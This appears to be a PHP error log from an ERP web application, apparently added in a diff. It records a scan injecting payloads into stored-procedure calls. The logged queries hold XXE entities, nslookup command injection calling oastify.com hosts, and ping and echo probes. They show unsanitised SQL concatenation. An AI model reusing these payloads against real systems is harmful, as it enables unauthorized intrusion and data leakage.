+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:54:59 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call sp_getDTMsgTrail("(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://pyr0oubnnhex8vs32vojw8j6xx3rrofr3iq8ex.oasti'||'fy.com/">%jbfab;]>'),'/l') from dual)")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://pyr0oubn' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getCommentDownTime.php(12): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call sp_getDTMsgTrail("'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://2qtdg730fu6a08kgu8gwolbjpav4j175vwim6b.oasti'||'fy.com/">%jbfab;]>'),'/l') from dual)||'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % jbfab SYSTEM "http://2qtdg730' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getCommentDownTime.php(12): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://vba610ot0nr3l159f11p9ewca3gx4wszgq3gr5.oasti'||'fy.com/">%qnlgh;]>'),'/l') from dual)")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://vba610ot' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined offset: 2 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://dm3ocizbb52lwjgrqjc7kw7ullrffe3ir9ez2o.oasti'||'fy.com/">%qnlgh;]>'),'/l') from dual)||'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % qnlgh SYSTEM "http://dm3ocizb' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:00 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:01 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:02 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("}}vdhsb'/"<axoky")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("%}swy6z'/"<ovbpm")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("zswa7%>rgbe7'/"<t1jw8")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:03 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined offset: 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1581
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("'"`0&nslookup -q=cname xst8i25vhp8523mbw3irqgder5xzly9vxmkc81.oastify.com.&`'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`0&nslookup -q=cname xst8i25vhp8523mbw3irqgder5xzly9vxmkc81.oastify.com.&`'")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:04 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&'"`0&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&`'")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`0&nslookup -q=cname v516v0itunl3f1z991vp3eqc43axywmraix8lx.oastify.com.&`'")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("|echo 8p1lb970sc j02b393h01||a #' |echo 8p1lb970sc j02b393h01||a #|" |echo 8p1lb970sc j02b393h01||a #")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '8p1lb970sc j02b393h01||a #")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""|echo mwfz990kwf j2r2wajfx7 ||")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'mwfz990kwf j2r2wajfx7 ||")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID("|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #" |ping -n 21 127.0.0.1")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""|ping -n 21 127.0.0.1 ||")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1 ||")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:55:39 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
